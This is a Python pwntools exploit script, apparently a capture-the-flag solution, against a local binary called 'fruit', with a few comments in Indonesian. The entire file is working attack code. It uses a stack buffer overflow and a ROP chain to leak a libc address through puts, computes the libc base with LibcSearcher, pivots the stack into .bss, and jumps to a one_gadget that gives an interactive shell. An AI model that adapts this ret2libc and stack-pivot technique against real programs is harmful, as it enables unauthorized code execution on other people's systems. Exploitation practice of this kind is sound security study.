from pwn import *
from LibcSearcher import LibcSearcher
# context.log_level = 'debug'
elf = ELF("./fruit")
s = elf.process()
data = elf.bss()
# gdb.attach(s)

pop_rdi = 0x0000000000401d33
pop_rsi_r15 = 0x0000000000401d31
leave = 0x000000000040127d
libcstart = elf.got['__libc_start_main']
puts = elf.plt['puts']
flush = elf.plt['fflush']

for i in range(5):
    s.sendlineafter(">>",str(9))

# %s
p = 'A'*176 #junk ke rbp
p += p64(data) # saved rbp ganti ke bss
p += p64(pop_rdi)
p += p64(libcstart)
p += p64(puts)
p += p64(pop_rdi)
p += p64(0)
p += p64(flush)
p += p64(pop_rsi_r15)
p += p64(data)
p += p64(0)
p += p64(pop_rdi)
p += p64(0x403056) #%s
p += p64(elf.plt['__isoc99_scanf'])
p += p64(leave)


s.sendline(p)
s.recvuntil(":)\n")
leak = u64(s.recvline().strip("\n").ljust(8,"\x00"))
log.info("LIBC Leaked : {}".format(hex(leak)))
libc = LibcSearcher('__libc_start_main', leak)
libcbase = leak - libc.dump('__libc_start_main')
log.info("Libc Base : {}".format(hex(libcbase)))

one_gadget = libcbase + 0x4f322

s.sendline(p64(0)+p64(one_gadget))

s.interactive()
